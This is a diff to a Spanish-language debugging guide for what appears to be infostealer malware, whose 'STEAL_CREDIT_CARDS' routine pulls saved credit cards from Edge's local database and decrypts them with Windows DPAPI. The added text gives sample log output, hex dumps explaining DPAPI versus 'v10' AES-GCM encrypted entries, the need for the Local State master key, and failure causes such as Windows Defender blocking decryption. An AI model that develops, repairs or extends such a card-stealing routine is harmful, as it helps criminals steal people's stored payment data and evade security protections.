@@ -83,32 +83,67 @@ Intentando browser: Edge
     Registro #1
       Nombre: pepito
       Exp: 1/2026
-      Encrypted bytes: 256
+      Encrypted bytes: 50
+      Primeros bytes (hex): 01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
+      ℹ️ Formato: DPAPI directo (raw bytes)
       ✅ DPAPI decrypt OK, bytes: 16
-      ✅ UTF8 conversion OK
+      Decrypted bytes (hex): 34 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31
+      ✅ UTF8 conversion OK: '4111111111111111'
       ✅ TARJETA AGREGADA!
     Total tarjetas extraídas: 1
 ```
 
-### ❌ Caso fallido - DPAPI bloqueado:
+**📊 Bytes explicados:**
+- `Encrypted bytes: 50` = Tamaño típico de DPAPI para 16 dígitos
+- `01 00 00 00` = Prefijo DPAPI en Windows
+- `Decrypted bytes: 34 31 31 31...` = ASCII "4111111111111111"
+
+### ❌ Caso fallido - Formato v10/v11 (AES-GCM):
 
 ```
 === STEAL_CREDIT_CARDS INICIADO ===
 Intentando browser: Edge
   ❌ No se encontraron tarjetas en Edge
-    Extrayendo tarjetas de: Edge
-    DB Path: "C:\\Users\\...\\Temp\\webdata_1234.db"
-    ✅ DB abierta correctamente
-    Ejecutando query...
-    ✅ Query preparado correctamente
-    Iterando sobre resultados...
     Registro #1
       Nombre: pepito
       Exp: 1/2026
-      Encrypted bytes: 256
-      ❌ DPAPI decrypt failed  ← AQUÍ ESTÁ EL PROBLEMA
-    Total tarjetas extraídas: 0
+      Encrypted bytes: 85
+      Primeros bytes (hex): 76 31 30 A7 B2 3C D9 1F 8E 2A 4B 7C 9D 3E 5F ...
+      ⚠️ Formato: v10 (AES-256-GCM) - Necesita master key
+      ❌ DPAPI decrypt failed - CryptUnprotectData retornó error
+      💡 Posibles causas:
+         - Windows Defender bloqueando DPAPI
+         - Diferente usuario encriptó los datos
+         - Tarjeta protegida por Microsoft Account
+         - Formato v10/v11 (AES-GCM) requiere master key
 ```
+
+**📊 Bytes explicados:**
+- `76 31 30` = ASCII "v10" = Edge usa AES-256-GCM con master key
+- `Encrypted bytes: 85+` = Formato moderno con nonce + ciphertext + tag
+- **PROBLEMA**: DPAPI no puede desencriptar esto, necesita master key de Local State
+
+### ❌ Caso fallido - DPAPI bloqueado:
+
+```
+Registro #1
+  Nombre: pepito
+  Exp: 1/2026
+  Encrypted bytes: 50
+  Primeros bytes (hex): 01 00 00 00 D0 8C 9D DF 01 15 D1 11 8C 7A 00 C0 4F C2 97 EB
+  ℹ️ Formato: DPAPI directo (raw bytes)
+  ❌ DPAPI decrypt failed - CryptUnprotectData retornó error
+  💡 Posibles causas:
+     - Windows Defender bloqueando DPAPI
+     - Diferente usuario encriptó los datos
+     - Tarjeta protegida por Microsoft Account
+     - Formato v10/v11 (AES-GCM) requiere master key
+```
+
+**📊 Diagnóstico:**
+- Formato correcto (DPAPI raw bytes)
+- Pero `CryptUnprotectData()` de Windows devuelve error
+- **Causa más probable**: Windows security bloqueando la llamada
 
 ### ❌ Caso fallido - DB no se puede abrir:
 
